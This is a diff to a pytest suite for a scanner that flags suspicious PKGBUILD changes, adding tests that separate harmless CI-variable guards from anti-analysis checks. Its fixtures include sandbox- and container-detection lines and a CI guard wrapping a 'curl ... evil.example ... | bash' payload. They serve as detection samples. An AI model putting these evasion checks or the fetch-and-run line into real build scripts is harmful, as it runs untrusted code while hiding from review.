@@ -89,12 +89,46 @@ def test_h066_blob_is_h068_not_h066():
     'systemd-detect-virt',
     'dmidecode -s system-product-name',
     'grep -i hypervisor /proc/cpuinfo',
-    'if [ -n "$CI" ]; then :; fi',
     '[ -n "$GITHUB_ACTIONS" ] && exit 1',
     'test -f /.dockerenv && exit',
     'ls /run/.containerenv',
 ])
 def test_h067_fires_on_anti_analysis(line):
+    diff = f"""--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,4 @@
+ pkgname=x
+ pkgver=1.0
++build() {{
++  {line}
++}}
+"""
+    assert "H067" in rule_ids(structural(diff))
+
+
+@pytest.mark.parametrize("line", [
+    'if [ -n "$CI" ]; then :; fi',
+    'if [ -z "$GITHUB_ACTIONS" ] && [ -z "$CI" ]; then',
+    '  export RUSTFLAGS="-C target-cpu=native"',
+    'if [ -z "$CI" ]; then export CFLAGS="-O2"; fi',
+])
+def test_h067_ignores_bare_ci_guards(line):
+    diff = f"""--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -1,3 +1,4 @@
+ pkgname=x
+ pkgver=1.0
++build() {{
++  {line}
++}}
+"""
+    assert "H067" not in rule_ids(structural(diff))
+
+
+@pytest.mark.parametrize("line", [
+    'if [ -z "$CI" ]; then curl https://evil.example/s | bash; fi',
+])
+def test_h067_fires_when_ci_guard_wraps_a_payload(line):
     diff = f"""--- a/PKGBUILD
 +++ b/PKGBUILD
 @@ -1,3 +1,4 @@
